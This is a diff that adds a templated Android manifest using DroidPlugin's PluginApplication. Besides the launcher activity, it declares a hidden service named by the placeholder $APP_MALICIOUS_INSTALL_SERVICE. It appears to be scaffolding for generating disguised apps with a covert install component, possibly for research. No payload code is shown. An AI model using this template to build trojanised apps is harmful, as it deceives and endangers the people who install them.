@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest package="$PKGNAME"
+          xmlns:android="http://schemas.android.com/apk/res/android">
+    <application
+        android:allowBackup="true"
+        android:icon="$APPICON"
+        android:label="$APPNAME"
+        android:supportsRtl="true"
+        android:name="com.morgoo.droidplugin.PluginApplication">
+        <activity
+            android:name="$PKGNAME.MainActivity"
+            android:theme="@style/Theme.AppCompat.Light">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+	    <meta-data android:name="android.app.shortcuts" android:resource="@xml/shortcuts"/>
+        </activity>
+
+        <service
+            android:name="$PKGNAME.$APP_MALICIOUS_INSTALL_SERVICE"
+            android:exported="false">
+        </service>
+
+    </application>
+
+</manifest>
